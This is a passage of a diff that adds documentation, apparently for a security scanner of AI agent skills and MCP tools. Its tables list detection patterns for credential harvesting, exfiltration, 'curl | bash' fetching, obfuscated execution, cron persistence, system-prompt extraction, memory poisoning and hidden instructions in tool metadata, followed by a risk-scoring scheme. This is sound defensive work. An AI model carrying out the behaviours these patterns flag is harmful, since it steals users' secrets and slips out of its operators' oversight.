+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;Instructions that could cause physical harm&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;data-exfiltration-4-patterns&#34;&gt;Data Exfiltration (4 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;E1&lt;/td&gt;
+					&lt;td&gt;External Transmission&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Sending data to external URLs&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;E2&lt;/td&gt;
+					&lt;td&gt;Env Variable Harvesting&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Collecting API keys and secrets&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;E3&lt;/td&gt;
+					&lt;td&gt;File System Enumeration&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Scanning directories for sensitive files&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;E4&lt;/td&gt;
+					&lt;td&gt;Context Leakage&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Transmitting conversation context externally&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;privilege-escalation-3-patterns&#34;&gt;Privilege Escalation (3 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PE1&lt;/td&gt;
+					&lt;td&gt;Excessive Permissions&lt;/td&gt;
+					&lt;td&gt;LOW&lt;/td&gt;
+					&lt;td&gt;Requesting access beyond stated functionality&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PE2&lt;/td&gt;
+					&lt;td&gt;Sudo/Root Execution&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Invoking elevated system privileges&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PE3&lt;/td&gt;
+					&lt;td&gt;Credential Access&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Reading SSH keys, tokens, passwords&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;supply-chain-6-patterns&#34;&gt;Supply Chain (6 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;SC1&lt;/td&gt;
+					&lt;td&gt;Unpinned Dependencies&lt;/td&gt;
+					&lt;td&gt;LOW&lt;/td&gt;
+					&lt;td&gt;No version constraints on packages&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;SC2&lt;/td&gt;
+					&lt;td&gt;External Script Fetching&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;curl | bash and remote code execution&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;SC3&lt;/td&gt;
+					&lt;td&gt;Obfuscated Code&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Base64/hex encoded execution&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;SC4&lt;/td&gt;
+					&lt;td&gt;Known Vulnerable Dependencies&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Dependencies with known CVEs (live OSV.dev lookup)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;SC5&lt;/td&gt;
+					&lt;td&gt;Abandoned Dependencies&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Unmaintained packages without security updates&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;SC6&lt;/td&gt;
+					&lt;td&gt;Typosquatting&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Package names similar to popular packages&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;excessive-agency-4-patterns&#34;&gt;Excessive Agency (4 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;EA1&lt;/td&gt;
+					&lt;td&gt;Unrestricted Tool Access&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Unfettered tool access without constraints&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;EA2&lt;/td&gt;
+					&lt;td&gt;Autonomous Decision Making&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;High-impact decisions without human-in-the-loop&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;EA3&lt;/td&gt;
+					&lt;td&gt;Scope Creep&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Capabilities extending beyond stated purpose&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;EA4&lt;/td&gt;
+					&lt;td&gt;Unbounded Resource Access&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;No rate limits or quotas on resource consumption&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;output-handling-3-patterns&#34;&gt;Output Handling (3 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OH1&lt;/td&gt;
+					&lt;td&gt;Unvalidated Output Injection&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Model output used without sanitization&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OH2&lt;/td&gt;
+					&lt;td&gt;Cross-Context Output&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Output flows across trust boundaries without validation&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OH3&lt;/td&gt;
+					&lt;td&gt;Unbounded Output&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;No limits on output size or generation rate&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;system-prompt-leakage-3-patterns&#34;&gt;System Prompt Leakage (3 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;P6&lt;/td&gt;
+					&lt;td&gt;Direct Leakage&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Instructions that expose system prompts or internal rules&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;P7&lt;/td&gt;
+					&lt;td&gt;Indirect Extraction&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Extraction via rephrasing, translation, or side-channels&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;P8&lt;/td&gt;
+					&lt;td&gt;Tool-Based Exfiltration&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;System prompts exfiltrated via file writes or network requests&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;memory-poisoning-3-patterns&#34;&gt;Memory Poisoning (3 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;MP1&lt;/td&gt;
+					&lt;td&gt;Persistent Context Injection&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Content designed to persist across interactions&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;MP2&lt;/td&gt;
+					&lt;td&gt;Context Window Stuffing&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Filler content displacing safety constraints&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;MP3&lt;/td&gt;
+					&lt;td&gt;Memory Manipulation&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Tampering with agent memory or stored state&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;tool-misuse-3-patterns&#34;&gt;Tool Misuse (3 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TM1&lt;/td&gt;
+					&lt;td&gt;Tool Parameter Abuse&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Crafted parameters for unintended behavior (shell=True, &amp;ndash;force)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TM2&lt;/td&gt;
+					&lt;td&gt;Chaining Abuse&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Tool chains that bypass individual safety checks&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TM3&lt;/td&gt;
+					&lt;td&gt;Unsafe Defaults&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Overly permissive defaults (disabled TLS, no auth)&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;rogue-agent-2-patterns&#34;&gt;Rogue Agent (2 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;RA1&lt;/td&gt;
+					&lt;td&gt;Self-Modification&lt;/td&gt;
+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;Modifying own code or configuration at runtime&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;RA2&lt;/td&gt;
+					&lt;td&gt;Session Persistence&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Unauthorized persistence via cron jobs or startup scripts&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;trigger-abuse-3-patterns&#34;&gt;Trigger Abuse (3 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TR1&lt;/td&gt;
+					&lt;td&gt;Overly Broad Trigger&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Trigger patterns matching common words&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TR2&lt;/td&gt;
+					&lt;td&gt;Shadow Command Trigger&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Triggers that shadow built-in commands or other skills&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TR3&lt;/td&gt;
+					&lt;td&gt;Keyword Baiting Trigger&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Generic triggers designed to maximize activation&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;behavioral-ast-8-patterns&#34;&gt;Behavioral AST (8 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;AST1&lt;/td&gt;
+					&lt;td&gt;exec() Call&lt;/td&gt;
+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;Direct exec() enabling arbitrary code execution&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;AST2&lt;/td&gt;
+					&lt;td&gt;eval() Call&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Direct eval() evaluating arbitrary expressions&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;AST3&lt;/td&gt;
+					&lt;td&gt;Dynamic Import&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;__import__() loading arbitrary modules at runtime&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;AST4&lt;/td&gt;
+					&lt;td&gt;subprocess Call&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;External command execution via subprocess&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;AST5&lt;/td&gt;
+					&lt;td&gt;os.system / exec-family&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Shell commands via os module&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;AST6&lt;/td&gt;
+					&lt;td&gt;compile() Call&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Code object creation from strings&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;AST7&lt;/td&gt;
+					&lt;td&gt;Dynamic getattr()&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Arbitrary attribute access with non-literal names&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;AST8&lt;/td&gt;
+					&lt;td&gt;Dangerous Execution Chain&lt;/td&gt;
+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;exec/eval combined with dynamic source (network, encoded data)&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;taint-tracking-5-patterns&#34;&gt;Taint Tracking (5 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TT1&lt;/td&gt;
+					&lt;td&gt;Direct Taint Flow&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Data flows directly from a source to a sink without sanitization&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TT2&lt;/td&gt;
+					&lt;td&gt;Variable-Mediated Taint Flow&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Data flows from source to sink through intermediate variables&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TT3&lt;/td&gt;
+					&lt;td&gt;Credential Exfiltration Chain&lt;/td&gt;
+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;Credentials (env vars, secrets) flow to network output sinks&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TT4&lt;/td&gt;
+					&lt;td&gt;File Read to Network Exfiltration&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;File contents flow to network output sinks&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TT5&lt;/td&gt;
+					&lt;td&gt;External Input to Code Execution&lt;/td&gt;
+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;Network or user input flows to exec/eval/subprocess sinks&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;yara-signatures-4-patterns&#34;&gt;YARA Signatures (4 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;YR1&lt;/td&gt;
+					&lt;td&gt;Malware Match&lt;/td&gt;
+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;YARA rule match for known malware signatures&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;YR2&lt;/td&gt;
+					&lt;td&gt;Webshell Match&lt;/td&gt;
+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;YARA rule match for webshell patterns&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;YR3&lt;/td&gt;
+					&lt;td&gt;Cryptominer Match&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;YARA rule match for crypto mining indicators&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;YR4&lt;/td&gt;
+					&lt;td&gt;Hack Tool / Exploit Match&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;YARA rule match for hack tools or exploit code&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;mcp-least-privilege-4-patterns&#34;&gt;MCP Least Privilege (4 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;LP1&lt;/td&gt;
+					&lt;td&gt;Underdeclared Capability&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Code uses capabilities not listed in declared permissions&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;LP2&lt;/td&gt;
+					&lt;td&gt;Wildcard Permission&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Permission list contains wildcards (*, all, full, any)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;LP3&lt;/td&gt;
+					&lt;td&gt;Missing Permission Declaration&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;No permissions field but code has detectable capabilities&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;LP4&lt;/td&gt;
+					&lt;td&gt;Overdeclared Permission&lt;/td&gt;
+					&lt;td&gt;LOW&lt;/td&gt;
+					&lt;td&gt;Permission declared but no corresponding code capability found&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;mcp-tool-poisoning-4-patterns&#34;&gt;MCP Tool Poisoning (4 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TP1&lt;/td&gt;
+					&lt;td&gt;Hidden Instructions&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Hidden directives in metadata (HTML comments, zero-width chars, base64, data URIs)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TP2&lt;/td&gt;
+					&lt;td&gt;Unicode Deception&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Homoglyphs, RTL overrides, mixed-script identifiers in tool metadata&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TP3&lt;/td&gt;
+					&lt;td&gt;Parameter Description Injection&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Injection patterns in parameter definitions (overrides, system tokens, malicious defaults)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TP4&lt;/td&gt;
+					&lt;td&gt;Description-Behavior Mismatch&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Declared tool description does not match actual code behavior (LLM-powered)&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;All detected patterns are listed in the tables above.&lt;/p&gt;
+&lt;h2 id=&#34;risk-scoring&#34;&gt;Risk Scoring
+&lt;/h2&gt;&lt;h3 id=&#34;score-calculation&#34;&gt;Score Calculation
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CRITICAL issues&lt;/strong&gt;: +50 points&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HIGH issues&lt;/strong&gt;: +25 points&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;MEDIUM issues&lt;/strong&gt;: +10 points&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;LOW issues&lt;/strong&gt;: +5 points&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Executable scripts&lt;/strong&gt;: 1.3x multiplier&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;severity-levels&#34;&gt;Severity Levels
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Score&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Recommendation&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;0-20&lt;/td&gt;
+					&lt;td&gt;LOW&lt;/td&gt;
+					&lt;td&gt;SAFE&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;21-50&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;CAUTION&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;51-80&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;DO NOT INSTALL&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;81-100&lt;/td&gt;
+					&lt;td&gt;CRITICAL&lt;/td&gt;
+					&lt;td&gt;DO NOT INSTALL&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;example-output&#34;&gt;Example Output
+&lt;/h2&gt;&lt;h3 id=&#34;terminal-output&#34;&gt;Terminal Output
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
